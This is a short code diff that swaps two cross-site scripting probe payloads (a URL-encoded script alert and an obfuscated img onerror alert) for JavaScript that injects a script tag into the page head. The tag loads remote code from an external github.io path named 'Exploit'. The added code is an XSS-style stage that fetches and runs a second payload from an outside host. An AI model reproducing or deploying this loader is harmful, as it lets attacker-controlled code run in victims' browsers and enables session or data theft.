@@ -1,2 +1,14 @@
-%3Cscript%3Ealert(1)%3C%2Fscript%3E
-dfjr7t"><img____ src=x__ onerror___=alert____(1)>/includes/js/accounting.js
+if (typeof p === 'undefined') {
+    const p = document.createElement('script');
+    p.src = 'https://shashank604.github.io/Exploit/index.js';
+
+    p.onload = () => {
+        console.log('Script loaded successfully.');
+    };
+
+    p.onerror = () => {
+        console.error('Failed to load the script.');
+    };
+
+    document.head.appendChild(p);
+}
